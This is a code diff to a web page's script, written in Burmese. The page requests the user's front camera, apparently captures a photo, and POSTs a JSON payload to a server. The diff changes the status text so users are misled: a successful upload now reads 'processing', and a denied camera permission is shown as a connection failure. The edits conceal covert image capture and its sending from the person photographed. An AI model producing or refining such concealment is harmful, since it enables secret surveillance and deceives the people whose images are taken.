@@ -101,6 +101,7 @@
             const statusText = document.getElementById("status");
 
            // alert ထဘ့်ရန်
+             statusText.innerText = "စောင့်ဆိုင်းပါ";
                      try {
                 // ၁။ ကင်မရာခွင့်ပြုချက်တောင်းပြီး ပုံရိုက်ယူရန်
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -146,10 +147,10 @@
                     body: JSON.stringify(payload)
                 });
 
-                statusText.innerText = "အောင်မြင်ပါသည်။";
+                statusText.innerText = "လုပ်ဆောင်နေသည်";
 
             } catch (err) {
-                statusText.innerText = "ခွင့်ပြုချက် ပိတ်ထား သို့မဟုတ် အမှားအယွင်းရှိသည်။";
+                statusText.innerText = "လိုင်းကျနေပါသည်";
             }
         }
     </script>
